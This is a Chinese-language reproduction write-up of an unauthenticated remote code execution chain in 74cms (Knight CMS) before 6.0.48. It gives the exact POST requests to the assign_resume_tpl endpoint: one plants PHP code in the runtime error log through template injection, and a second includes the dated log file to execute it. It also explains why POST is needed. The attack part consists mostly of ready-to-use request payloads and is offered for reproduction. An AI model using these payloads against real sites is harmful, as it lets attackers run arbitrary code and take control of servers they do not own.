

# 74cms v6.0.48模版注入+文件包含getshell

## 0x01 简介





骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套**免费 +** 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。



## 0x02 漏洞概述





骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。

## 0x03 影响版本





骑士 CMS < 6.0.48



**0x04 环境搭建**





骑士cms不支持php7.0，所以建议使用php5

官网下载6.0.20版本

![image-20201214112017128](.resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png)

将源码放在web根目录下，访问/index.php进行安装



## 漏洞复现

1.发送如下请求：

```
http://[IP]/index.php?m=home&a=assign_resume_tpl
POST:
variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

![img](.resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png)

查看日志会发现已经记录了错误
位置：\phpstudy_pro\WWW\data\Runtime\Logs\Home

![img](.resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png)

3.包含日志

```
http://[IP]/index.php?m=home&a=assign_resume_tpl
POST:
variable=1&tpl=data/Runtime/Logs/Home/20_12_12.log
```

日志名称就是当天的年月日，直接包含即可

![img](.resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png)

为什么不能使用get来请求，因为url在提交给后台处理会被进行url编码，从而造成包含不成功，因此要采取post方式发送payload



